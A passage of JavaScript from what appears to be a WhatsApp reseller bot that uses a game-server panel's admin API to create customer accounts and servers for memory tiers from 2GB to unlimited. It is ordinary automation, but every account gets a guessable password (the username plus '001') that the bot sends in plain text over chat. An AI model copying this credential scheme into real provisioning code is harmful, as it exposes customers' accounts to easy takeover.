ctf = `*BERIKUT DATA AKUN PANEL ANDA* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}



NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=============================
`
client.sendMessage(u,{image: {url: panelgmbr}, caption: ctf }, { quoted: client.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "${hariini}",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
case "2gb": {
if (!isSeler && !groupseller && !isOwner) return reply(`*KHUSUS RESELLER DIKZZ-SHOP!*`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2072"
let cpu = "60"
let disk = "2072"
let email = username + "dikatoki@cpanel.bot"

if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `*BERIKUT DATA AKUN PANEL ANDA* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}



NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=============================
`
client.sendMessage(u,{image: {url: panelgmbr}, caption: ctf }, { quoted: client.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "${hariini}",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (!isSeler && !groupseller && !isOwner) return reply(`*KHUSUS RESELLER DIKZZ-SHOP!*`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "80"
let disk = "3072"
let email = username + "dikatoki@cpanel.bot"

if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `*BERIKUT DATA AKUN PANEL ANDA* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}



NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=============================
`
client.sendMessage(u,{image: {url: panelgmbr}, caption: ctf }, { quoted: client.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "${hariini}",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
if (!isSeler && !groupseller && !isOwner) return reply(`*KHUSUS RESELLER DIKZZ-SHOP!*`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4Gb"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "100"
let disk = "4000"
let email = username + "dikatoki@cpanel.bot"

if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `*BERIKUT DATA AKUN PANEL ANDA* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}



NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=============================
`
client.sendMessage(u,{image: {url: panelgmbr}, caption: ctf }, { quoted: client.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "${hariini}",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
if (!isSeler && !groupseller && !isOwner) return reply(`*KHUSUS RESELLER DIKZZ-SHOP!*`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "dikatoki@cpanel.bot"

if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `*BERIKUT DATA AKUN PANEL ANDA* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}



NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=============================
`
client.sendMessage(u,{image: {url: panelgmbr}, caption: ctf }, { quoted: client.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "${hariini}",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (!isSeler && !groupseller && !isOwner) return reply(`*KHUSUS RESELLER DIKZZ-SHOP!*`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "120"
let disk = "5138"
let email = username + "dikatoki@cpanel.bot"

if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
